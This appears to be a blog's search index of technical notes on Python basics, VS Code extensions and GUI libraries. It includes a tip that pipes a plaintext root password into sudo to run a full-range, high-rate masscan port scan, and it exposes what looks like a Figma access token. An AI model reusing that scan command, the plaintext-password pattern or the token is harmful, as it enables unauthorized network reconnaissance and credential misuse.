<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Test local image</title>
    <link href="/2023/03/23/Test/test-local-image/"/>
    <url>/2023/03/23/Test/test-local-image/</url>
    
    <content type="html"><![CDATA[<h1 id="Test-local-image"><a href="#Test-local-image" class="headerlink" title="Test local image"></a>Test local image</h1><p><img src="/2023/03/23/Test/test-local-image/image-20230323112709634.png" alt="image-20230323112709634"></p>]]></content>
    
    
    <categories>
      
      <category>Test</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Test</tag>
      
      <tag>Image</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python</title>
    <link href="/2023/03/18/Code/Python/Python/"/>
    <url>/2023/03/18/Code/Python/Python/</url>
    
    <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>a = &#123;&#125;<br><span class="hljs-meta">&gt;&gt;&gt; </span>b = &#123;&#125;<br>&gt;&gt;&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>a[<span class="hljs-number">1</span>] = <span class="hljs-number">2</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>a<br>&#123;<span class="hljs-number">1</span>: <span class="hljs-number">2</span>&#125;<br>&gt;&gt;&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>b[<span class="hljs-string">&quot;a&quot;</span>] = a<br><span class="hljs-meta">&gt;&gt;&gt; </span>b<br>&#123;<span class="hljs-string">&#x27;a&#x27;</span>: &#123;<span class="hljs-number">1</span>: <span class="hljs-number">2</span>&#125;&#125;<br>&gt;&gt;&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>a[<span class="hljs-number">1</span>] = <span class="hljs-number">3</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>b<br>&#123;<span class="hljs-string">&#x27;a&#x27;</span>: &#123;<span class="hljs-number">1</span>: <span class="hljs-number">3</span>&#125;&#125;<br>&gt;&gt;&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>a = &#123;<span class="hljs-number">1</span>:<span class="hljs-number">2</span>&#125;<br><span class="hljs-meta">&gt;&gt;&gt; </span>b<br>&#123;<span class="hljs-string">&#x27;a&#x27;</span>: &#123;<span class="hljs-number">1</span>: <span class="hljs-number">3</span>&#125;&#125;<br><span class="hljs-meta">&gt;&gt;&gt; </span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>():</span><br>    udict = &#123;&#125;<br>    temp = &#123;&#125;<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>        count = i+<span class="hljs-number">1</span><br>        temp[<span class="hljs-string">&quot;a&quot;</span>] = count<br>        udict[i] = temp<br>    <span class="hljs-built_in">print</span>(udict)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run_1</span>():</span><br>    udict = &#123;&#125;<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>        count = i+<span class="hljs-number">1</span><br>        temp = &#123;&#125;<br>        temp[<span class="hljs-string">&quot;a&quot;</span>] = count<br>        udict[i] = temp<br>    <span class="hljs-built_in">print</span>(udict)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run_2</span>():</span><br>    udict = &#123;&#125;<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>        count = i+<span class="hljs-number">1</span><br>        temp = &#123;<span class="hljs-string">&quot;a&quot;</span>:count&#125;<br>        udict[i] = temp<br>    <span class="hljs-built_in">print</span>(udict)<br><br>run()<br>run_1()<br>run_2()<br><br><span class="hljs-comment"># &#123;0: &#123;&#x27;a&#x27;: 5&#125;, 1: &#123;&#x27;a&#x27;: 5&#125;, 2: &#123;&#x27;a&#x27;: 5&#125;, 3: &#123;&#x27;a&#x27;: 5&#125;, 4: &#123;&#x27;a&#x27;: 5&#125;&#125;</span><br><span class="hljs-comment"># &#123;0: &#123;&#x27;a&#x27;: 1&#125;, 1: &#123;&#x27;a&#x27;: 2&#125;, 2: &#123;&#x27;a&#x27;: 3&#125;, 3: &#123;&#x27;a&#x27;: 4&#125;, 4: &#123;&#x27;a&#x27;: 5&#125;&#125;</span><br><span class="hljs-comment"># &#123;0: &#123;&#x27;a&#x27;: 1&#125;, 1: &#123;&#x27;a&#x27;: 2&#125;, 2: &#123;&#x27;a&#x27;: 3&#125;, 3: &#123;&#x27;a&#x27;: 4&#125;, 4: &#123;&#x27;a&#x27;: 5&#125;&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
      <tag>Code</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sudo密码直接添加到命令行以方便实现脚本自动化</title>
    <link href="/2023/03/16/Linux/sudo%E5%AF%86%E7%A0%81%E7%9B%B4%E6%8E%A5%E6%B7%BB%E5%8A%A0%E5%88%B0%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%BB%A5%E6%96%B9%E4%BE%BF%E5%AE%9E%E7%8E%B0%E8%84%9A%E6%9C%AC%E8%87%AA%E5%8A%A8%E5%8C%96/"/>
    <url>/2023/03/16/Linux/sudo%E5%AF%86%E7%A0%81%E7%9B%B4%E6%8E%A5%E6%B7%BB%E5%8A%A0%E5%88%B0%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%BB%A5%E6%96%B9%E4%BE%BF%E5%AE%9E%E7%8E%B0%E8%84%9A%E6%9C%AC%E8%87%AA%E5%8A%A8%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="sudo密码直接添加到命令行以方便实现脚本自动化"><a href="#sudo密码直接添加到命令行以方便实现脚本自动化" class="headerlink" title="sudo密码直接添加到命令行以方便实现脚本自动化"></a>sudo密码直接添加到命令行以方便实现脚本自动化</h1><blockquote><p>原文链接：<a href="https://www.cnblogs.com/gaowengang/p/13947190.html">https://www.cnblogs.com/gaowengang/p/13947190.html</a></p></blockquote><p>方法1：使用管道传递密码。</p><p>比如 root 密码为 kali，要执行命令 masscan，则用法如下，</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">echo</span> kali | sudo -S masscan ip -p0-65535 --rate 100000 -oL ip.txt</span><br></code></pre></td></tr></table></figure><p>其中 -S 参数表示： read the password from the standard input instead of using the terminal device. The password must be followed by a newline character.</p><p>方法2：使用文本重定向。</p><p>比如 root 密码为 kali，要执行命令 masscan，则用法如下 (shell 脚本中)，</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo masscan ip -p0-65535 --rate 100000 -oL ip.txt &lt;&lt; END   <br><span class="hljs-meta">#</span><span class="bash"> 后续的输入作为子命令或子 shell 的输入，直到遇到 END（这里的 END 可以自定义，比如 OK， EOF，等都可以）</span><br>kali<br>END<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>sudo</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python扩展-VScode</title>
    <link href="/2023/02/13/Code/Python/Python%E6%89%A9%E5%B1%95-VScode/"/>
    <url>/2023/02/13/Code/Python/Python%E6%89%A9%E5%B1%95-VScode/</url>
    
    <content type="html"><![CDATA[<h1 id="Python扩展-VScode"><a href="#Python扩展-VScode" class="headerlink" title="Python扩展-VScode"></a>Python扩展-VScode</h1><h2 id="0x01-Python"><a href="#0x01-Python" class="headerlink" title="0x01 Python"></a>0x01 Python</h2><p><a href="https://cloud.tencent.com/developer/article/1786086">用 VS Code 写 Python，这几个插件是必装的！ - 腾讯云开发者社区-腾讯云 (tencent.com)</a></p><h3 id="1、python"><a href="#1、python" class="headerlink" title="1、python"></a>1、python</h3><p>IntelliSense (Pylance), Linting, Debugging (multi-threaded, remote), Jupyter Notebooks, code formatting, refactoring, unit tests, and more.</p><h3 id="2、python-snippet"><a href="#2、python-snippet" class="headerlink" title="2、python snippet"></a>2、python snippet</h3><p>Code snippets for python</p><h3 id="3、arepl"><a href="#3、arepl" class="headerlink" title="3、arepl"></a>3、arepl</h3><p>real-time python scratchpad（实时运行）</p><h3 id="4、kite-copilot"><a href="#4、kite-copilot" class="headerlink" title="4、kite - copilot"></a>4、kite - copilot</h3><p><a href="http://www.5190m.top/note/2022/6/24/2022-06-24-code-with-kite.html">Kite的安装以及在Jupyter和VSCode中的使用 | 记录技术笔记 (5190m.top)</a></p><h3 id="5、autodocstring-python-docstring-generator"><a href="#5、autodocstring-python-docstring-generator" class="headerlink" title="5、autodocstring - python docstring generator"></a>5、autodocstring - python docstring generator</h3><p>Generates python docstrings automatically（文档说明编写）</p><h3 id="6、python-test-explorer"><a href="#6、python-test-explorer" class="headerlink" title="6、python test explorer"></a>6、python test explorer</h3><p>Run your Python tests in the Sidebar of Visual Studio Code（测试运行）</p><p>Pytest：设置中启用 Python &gt; Testing: Pytest Enabled 然后根据提示安装 or 直接 pip 安装</p><h2 id="0x02-Others"><a href="#0x02-Others" class="headerlink" title="0x02 Others"></a>0x02 Others</h2><p><a href="https://www.gxlsystem.com/qianduan-2413377.html">2023年最新最全的VScode插件推荐 (gxlsystem.com)</a></p><p><a href="https://zhuanlan.zhihu.com/p/265806538">超强大！没有这 24 款插件的 VScode 是没有灵魂的！ - 知乎 (zhihu.com)</a></p><h3 id="1、vscode-json"><a href="#1、vscode-json" class="headerlink" title="1、vscode-json"></a>1、vscode-json</h3><p>Beautify/Uglify/Escape/Unescape JSON（操作美化json）</p><p>快捷键：</p><ul><li><code>cmd+alt+v</code>，验证</li><li><code>cmd+alt+b</code>，格式化</li><li><code>cmd+alt+u</code>，压缩</li><li><code>cmd+alt+&#39;</code>，加转义字符</li><li><code>cmd+alt+;</code>，去转义字符</li></ul><h3 id="2、Regex-Previewer"><a href="#2、Regex-Previewer" class="headerlink" title="2、Regex Previewer"></a>2、Regex Previewer</h3><p>预览正则表达式效果</p>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
      <tag>VScode</tag>
      
      <tag>extension</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python GUI</title>
    <link href="/2023/01/28/Code/Python/Python-GUI/"/>
    <url>/2023/01/28/Code/Python/Python-GUI/</url>
    
    <content type="html"><![CDATA[<h1 id="Python-GUI"><a href="#Python-GUI" class="headerlink" title="Python GUI"></a>Python GUI</h1><h2 id="0x01-Tkinter"><a href="#0x01-Tkinter" class="headerlink" title="0x01 Tkinter"></a>0x01 Tkinter</h2><p><strong>Tkinter：</strong></p><ul><li>Tkinter 是一个基于 tcl 的桌面应用程序开发工具，Python 使用 Tkinter 可以快速创建 GUI 应用程序</li><li><p>Tkinter 是 Python 的标准 GUI 库，又称 Tk 接口，是一个轻量级的跨平台图形用户界面（GUI）开发工具</p></li><li><p>Tkinter 是 Tk 图形用户界面工具包标准的 Python 接口，可以运行在大多数 Unix、Windows 和 Mac OS 系统中</p></li><li><p>Python 的默认 IDLE 就是使用 Tkinter 开发的</p></li></ul><p><strong>使用教程：</strong></p><ul><li><p><a href="https://docs.python.org/zh-cn/3/library/tk.html">Tk图形用户界面(GUI) — Python 3.11.1 文档</a></p></li><li><p><a href="https://zhuanlan.zhihu.com/p/92017216">Python的标准GUI库：Tkinter开发基础 - 知乎 (zhihu.com)</a></p></li><li><p><a href="https://blog.csdn.net/muzihuaner/article/details/106248343">【Python】Tkinter教程_木子欢儿的博客-CSDN博客</a></p></li><li><a href="https://www.cnblogs.com/shwee/p/9427975.html">Python GUI之tkinter窗口视窗教程大集合 - 洪卫 - 博客园 (cnblogs.com)</a></li><li><a href="https://www.runoob.com/python/python-gui-tkinter.html">Python GUI 编程(Tkinter) | 菜鸟教程 (runoob.com)</a></li><li><a href="https://docs.python.org/zh-cn/3/library/tkinter.ttk.html#label-options">tkinter.ttk —- Tk 风格的控件 — Python 3.11.1 文档</a></li></ul><h3 id="1、Sun-Valley-ttk-theme"><a href="#1、Sun-Valley-ttk-theme" class="headerlink" title="1、Sun-Valley-ttk-theme"></a>1、Sun-Valley-ttk-theme</h3><blockquote><p>Tkinter 默认的样式是比较丑的，并且不支持自定义样式。为了改善这种印象，官方就提供了 ttk 组件，是对 tkinter 的一个拓展，允许对 tkinter 默认的样式进行修改。而 Sun-Valley-ttk-theme 是使用了 tcl 与 ttk 基础，创建了一个类似 win 11 系统风格的主题样式。并且基于类似这个项目的还有 Azure-ttk-theme 与 Forest-ttk-theme 。一个是 win11 系统风格，一个是类似 Excel 的主题。</p><p>原文链接：<a href="https://blog.csdn.net/fei347795790/article/details/123154170">https://blog.csdn.net/fei347795790/article/details/123154170</a></p></blockquote><p><strong>A gorgeous theme for ttk, based on Microsoft’s Sun Valley visual styles ✨</strong></p><p><strong>Github：</strong><a href="https://github.com/rdbende/Sun-Valley-ttk-theme">rdbende/Sun-Valley-ttk-theme (github.com)</a></p><p><strong>Examples：</strong><a href="https://github.com/rdbende/Sun-Valley-ttk-examples">rdbende/Sun-Valley-ttk-examples: Example apps</a></p><p><strong>PyPI：</strong><a href="https://pypi.org/project/sv-ttk/">sv-ttk · PyPI</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> pip install sv-ttk</span><br></code></pre></td></tr></table></figure><h3 id="2、Visual-TK"><a href="#2、Visual-TK" class="headerlink" title="2、Visual TK"></a>2、Visual TK</h3><p><strong>Visual Python Tkinter GUI Creator</strong></p><p><strong>URL：</strong><a href="https://visualtk.com/">Visual TK, Visual Python Tkinter GUI Creator</a></p><h3 id="3、Tkinter-Designer"><a href="#3、Tkinter-Designer" class="headerlink" title="3、Tkinter Designer"></a>3、Tkinter Designer</h3><p><strong>An easy and fast way to create a Python GUI 🐍</strong> </p><p><strong>Github：</strong><a href="https://github.com/ParthJadhav/Tkinter-Designer">ParthJadhav/Tkinter-Designer:</a></p><p><strong>Figma：</strong><a href="https://www.figma.com/">Figma: the collaborative interface design tool.</a></p><blockquote><p>Figma：Test<br>figd_GwhP7_etvHhtskDMPDNA6PSYvPsrCEeEPa5Hm2Bq<br>Copy this token. This is your only chance to do so!</p></blockquote><h2 id="0x02-PyQt"><a href="#0x02-PyQt" class="headerlink" title="0x02 PyQt"></a>0x02 PyQt</h2><p>原文链接：<a href="https://blog.csdn.net/ungoing/article/details/127181855">https://blog.csdn.net/ungoing/article/details/127181855</a></p><h2 id="0x03-Kivy"><a href="#0x03-Kivy" class="headerlink" title="0x03 Kivy"></a>0x03 Kivy</h2><h2 id="0x04-wxPython"><a href="#0x04-wxPython" class="headerlink" title="0x04 wxPython"></a>0x04 wxPython</h2><h2 id="0x05-Flexx"><a href="#0x05-Flexx" class="headerlink" title="0x05 Flexx"></a>0x05 Flexx</h2><h2 id="0x06-PySide"><a href="#0x06-PySide" class="headerlink" title="0x06 PySide"></a>0x06 PySide</h2><h2 id="0x07-PyGTK"><a href="#0x07-PyGTK" class="headerlink" title="0x07 PyGTK"></a>0x07 PyGTK</h2>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
      <tag>Code</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python getting started</title>
    <link href="/2023/01/11/Code/Python/Python-getting-started/"/>
    <url>/2023/01/11/Code/Python/Python-getting-started/</url>
    
    <content type="html"><![CDATA[<h1 id="Python-getting-started"><a href="#Python-getting-started" class="headerlink" title="Python getting started"></a>Python getting started</h1><blockquote><p>微软官方python教程</p><ul><li><p><a href="https://www.bilibili.com/video/BV1nE41127zQ">微软官方 Python 入门教程_bilibili</a></p></li><li><p><a href="https://www.bilibili.com/video/BV1WT4y137cD/">微软官方 Python 进阶教程_bilibili</a></p></li><li><p><a href="https://www.bilibili.com/video/BV1qa4y1Y7CD/">微软官方 Python 高阶教程_bilibili</a></p></li></ul><p>Github仓库</p><ul><li><a href="https://github.com/microsoft/c9-python-getting-started">GitHub - microsoft/c9-python-getting-started: Sample code for Channel 9 Python for Beginners course</a></li></ul></blockquote><h2 id="一、Python-for-beginners"><a href="#一、Python-for-beginners" class="headerlink" title="一、Python for beginners"></a>一、Python for beginners</h2><p><strong>What is Python?</strong></p><ul><li>Flexible programming language</li><li>Designed to be human readable</li></ul><blockquote><p>Python is an interpreted, high-level, general-purpose programming language. Created by Guido van Rossum and first released in 1991, Python’s design philosophy emphasizes code readability with its notable use of significant whitespace. Its language constructs and object-oriented approach aims to help programmers write clear, logical code for small and large-scale projects.</p><p><a href="https://en.wikipedia.org/wiki/Python_(programming_language">https://en.wikipedia.org/wiki/Python_(programming_language</a>)</p></blockquote><p><strong>Why use Python?</strong></p><ul><li>Great starter language</li><li>Great advanced language</li><li>Wonderful community</li></ul><p><strong>What can I build with Python?</strong></p><ul><li>Machine learning models</li><li>Artificial intelligence projects</li><li>Web applications</li><li>Automation utilities</li><li>Anything, really</li></ul><h3 id="1、Print"><a href="#1、Print" class="headerlink" title="1、Print"></a>1、Print</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># print displays output to your console</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Hello world&#x27;</span>)<br><br><span class="hljs-comment"># Enclose strings in single or double quotes</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Hello world&quot;</span>)<br><br><span class="hljs-comment"># Getting information from the user</span><br>name = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;Please enter your name:&#x27;</span>)<br><span class="hljs-built_in">print</span>(name)<br><br><span class="hljs-comment"># Printing blank lines can improve readability</span><br><span class="hljs-built_in">print</span>()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Hello \nworld&#x27;</span>)<br><br><span class="hljs-comment"># Debugging with print</span><br><br></code></pre></td></tr></table></figure><h3 id="2、Comments"><a href="#2、Comments" class="headerlink" title="2、Comments"></a>2、Comments</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># We add comments to our code using #</span><br><span class="hljs-comment"># Lines that start with # are not executed</span><br><span class="hljs-comment"># Comment calls to other programs to explain their purpose</span><br><span class="hljs-comment"># Comments document your code so you and other programmers can understand the code</span><br><span class="hljs-comment"># Commenting lines of code can help you debug and figure out which line of code is causing an error</span><br><br><span class="hljs-comment"># This is a comment</span><br><span class="hljs-comment"># print(&#x27;Hello world&#x27;)</span><br><br></code></pre></td></tr></table></figure><h3 id="3、String"><a href="#3、String" class="headerlink" title="3、String"></a>3、String</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Strings can be stored in variables</span><br><span class="hljs-comment"># You can combine strings with +</span><br>first_name = <span class="hljs-string">&#x27;John&#x27;</span><br>last_name = <span class="hljs-string">&#x27;Wong&#x27;</span><br><span class="hljs-built_in">print</span>(first_name)<br><span class="hljs-built_in">print</span>(last_name)<br><span class="hljs-built_in">print</span>(first_name + last_name)<br><br><span class="hljs-comment"># Getting information from the user</span><br>first_name = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;Please enter your first name:&#x27;</span>)<br>last_name = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;Please enter your last name:&#x27;</span>)<br><span class="hljs-built_in">print</span>(first_name + <span class="hljs-string">&#x27; &#x27;</span> + last_name)<br><span class="hljs-built_in">print</span>(first_name + <span class="hljs-string">&#x27; &#x27;</span> \<br>      + last_name)<br><br><span class="hljs-comment"># You can use functions to modify strings</span><br>sentence = <span class="hljs-string">&#x27;This is my dog&#x27;</span><br><span class="hljs-built_in">print</span>(sentence.upper())<br><span class="hljs-built_in">print</span>(sentence.lower())<br><span class="hljs-built_in">print</span>(sentence.capitalize())<br><span class="hljs-built_in">print</span>(sentence.count(<span class="hljs-string">&#x27;a&#x27;</span>))<br><br><span class="hljs-comment"># format strings</span><br>output = <span class="hljs-string">&#x27;Hello, &#x27;</span> + first_name + <span class="hljs-string">&#x27; &#x27;</span> + last_name<br>output = <span class="hljs-string">&#x27;Hello, &#123;&#125; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(first_name,last_name)<br>output = <span class="hljs-string">&#x27;Hello, &#123;0&#125; &#123;1&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(first_name,last_name)<br>output = <span class="hljs-string">f&#x27;Hello, <span class="hljs-subst">&#123;first_name&#125;</span> <span class="hljs-subst">&#123;last_name&#125;</span>&#x27;</span><br><br></code></pre></td></tr></table></figure><h3 id="4、Numbers"><a href="#4、Numbers" class="headerlink" title="4、Numbers"></a>4、Numbers</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Numbers can be stored in variables</span><br>pi = <span class="hljs-number">3.14</span><br><span class="hljs-built_in">print</span>(pi)<br><br><span class="hljs-comment"># You can do math with numbers </span><br>first_number = <span class="hljs-number">6</span><br>second_name = <span class="hljs-number">2</span><br><span class="hljs-built_in">print</span>(first_number + second_name)<br><span class="hljs-built_in">print</span>(first_number ** second_name)<br><br><span class="hljs-comment"># If you combine strings with numbers, Python gets confused</span><br><span class="hljs-comment"># When displaying a string that contains numbers you must convert the numbers into strings</span><br>days_in_feb = <span class="hljs-number">28</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(days_in_feb) + <span class="hljs-string">&#x27;days in February&#x27;</span>)<br><br><span class="hljs-comment"># Numbers can be stored as strings</span><br><span class="hljs-comment"># Numbers stored as strings are treated as strings</span><br>first_number = <span class="hljs-string">&#x27;5&#x27;</span><br>second_name = <span class="hljs-string">&#x27;6&#x27;</span><br><span class="hljs-built_in">print</span>(first_number + second_name)<br><br><span class="hljs-comment"># The input function always returns strings</span><br><span class="hljs-comment"># Numbers stored as strings must be converted to numeric values before doing math</span><br>first_number = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;Enter your first number:&#x27;</span>)<br>second_name = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;Enter your second number:&#x27;</span>)<br><span class="hljs-built_in">print</span>(first_number + second_name)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">int</span>(first_number) + <span class="hljs-built_in">int</span>(second_name))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">float</span>(first_number) + <span class="hljs-built_in">float</span>(second_name))<br><br></code></pre></td></tr></table></figure><h3 id="5、Dates"><a href="#5、Dates" class="headerlink" title="5、Dates"></a>5、Dates</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># To get current date and time, we need to use the datetime library</span><br><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime,timedelta<br><br><span class="hljs-comment"># The now function returns a datetime object</span><br>current_date = datetime.now()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Today is: &#x27;</span> + <span class="hljs-built_in">str</span>(current_date))<br><br><span class="hljs-comment"># Use date functions to control date formatting</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Day: &#x27;</span> + <span class="hljs-built_in">str</span>(current_date.day))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Month: &#x27;</span> + <span class="hljs-built_in">str</span>(current_date.month))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Year: &#x27;</span> + <span class="hljs-built_in">str</span>(current_date.year))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Hour: &#x27;</span> + <span class="hljs-built_in">str</span>(current_date.hour))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Minute: &#x27;</span> + <span class="hljs-built_in">str</span>(current_date.minute))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Second: &#x27;</span> + <span class="hljs-built_in">str</span>(current_date.second))<br><br><span class="hljs-comment"># timedelta is used to define a period of time</span><br><span class="hljs-comment"># you can use timedelta to add or remove days, or weeks to a date</span><br>one_day = timedelta(days=<span class="hljs-number">1</span>)<br>today = datetime.now()<br>yesterday = today - one_day<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Yesterday was: &#x27;</span> + <span class="hljs-built_in">str</span>(yesterday))<br><br><span class="hljs-comment"># Sometimes you receive the date as a string and need to convert it to a datetime object</span><br><span class="hljs-comment"># Make sure you add exception handling in case  the date entered is invalid</span><br>birthday = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;when is your birthday(dd/mm/yyyy)? &#x27;</span>)<br>birthday_date = datetime.strptime(birthday, <span class="hljs-string">&#x27;%d%m%Y&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Brithday: &#x27;</span> + <span class="hljs-built_in">str</span>(brithday_date))<br><br><span class="hljs-comment"># Converting it to a datetime allows you to use the date functions</span><br>one_day = timedelta(days=<span class="hljs-number">1</span>)<br>birthday_eve = birthday_date - one_day<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Day before birthday: &#x27;</span> + <span class="hljs-built_in">str</span>(birthday_eve))<br><br></code></pre></td></tr></table></figure><h3 id="6、Error-handling"><a href="#6、Error-handling" class="headerlink" title="6、Error handling"></a>6、Error handling</h3><figure 